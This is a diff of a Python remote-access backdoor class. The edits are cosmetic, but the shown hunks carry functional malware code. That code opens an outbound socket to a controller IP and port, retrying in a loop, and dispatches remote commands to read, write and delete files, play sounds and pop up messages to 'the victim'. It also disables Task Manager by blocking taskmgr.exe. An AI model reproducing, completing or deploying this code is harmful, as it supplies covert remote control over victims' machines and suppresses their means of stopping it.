@@ -33,7 +33,7 @@ class backdoor:
     def __init__(self, ip, port):
         while True:
             try:
-                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)     #Address family, Socket tpye
                 self.connection.connect((ip, port))
             except socket.error:
                 time.sleep(5)
@@ -96,9 +96,9 @@ class backdoor:
     def show_message_box_popup(self, message):
         try:
             str_script = os.path.join(self.TMP, "m.vbs")
-
             with open(str_script, "w") as objVBS:
                 objVBS.write(f'Msgbox "{message}", vbOKOnly+vbInformation+vbSystemModal, "Message"')
+            
             subprocess.Popen(["cscript", str_script], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
             return "[+] Send the victim the following message: {}.".format(message)
         except Exception as e:
@@ -140,6 +140,7 @@ class backdoor:
 
                 self.vbs_block_process("taskmgr.exe", popup=popup)
                 self.tm_enabled = False
+
                 return "[+] Task Manager Disabled."
         except Exception as e:
             return "[-] Couldn't change the State of the Task Manager: {}.".format(e)
@@ -219,7 +220,7 @@ class backdoor:
     def change_working_directory_to(self, path):
         try:
             os.chdir(path)
-            return "[+] Changing working directory to: {}.".format(os.getcwd())
+            return "[+] Changing directory to: {}.".format(os.getcwd())
         except Exception as e:
             return "[-] Error changing directory to: {}, {}.".format(path, e)
 
@@ -291,7 +292,7 @@ class backdoor:
                         command_result = self.write_file(path, data)
                     elif command_0 == "read":   #Read file's content
                         command_result = self.work_manager.read_content_of_file(rest_of_command)
-                    elif command_0 == "psound":     #Stop sound
+                    elif command_0 == "psound":     #Play sound
                         command_result = self.work_manager.play_sound(rest_of_command, False)
                     elif command_0 == "del":    #Delete file\folder
                         command_result = self.work_manager.delete_path(rest_of_command)
